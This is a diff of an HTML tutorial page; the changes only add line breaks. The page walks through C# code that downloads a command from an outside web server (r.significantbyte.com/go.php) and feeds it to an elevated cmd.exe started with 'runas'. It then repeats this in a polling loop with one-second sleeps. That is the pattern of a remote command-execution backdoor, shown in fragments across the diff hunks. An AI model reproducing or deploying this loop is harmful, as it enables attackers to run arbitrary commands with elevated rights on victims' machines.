@@ -4,7 +4,7 @@
 <b>This will get the command from online web server.
 </b><br>
                           new WebClient().DownloadString("https://r.significantbyte.com/go.php");<br>
-<br>
+<br><br><br>
 <b>Run command in device.</b><br>
                             Process cmd = new Process();<br>
                             cmd.StartInfo.FileName = "cmd.exe";<br>
@@ -15,10 +15,10 @@
                             cmd.StartInfo.Verb = "runas";<br>
                             cmd.Start();<br>
                             cmd.StandardInput.WriteLine(json);<br>
-                            <br>
+                            <br><br><br>
   
-<b>Lets wait for 1 second</b>
-                            Thread.Sleep(1000);
+<b>Lets wait for 1 second</b><br>
+                            Thread.Sleep(1000);<br><br><br>
 <b>Now lets combine the whole idea. Get the command and run cmd in while loop</b>
  while (chk == 0)
             {
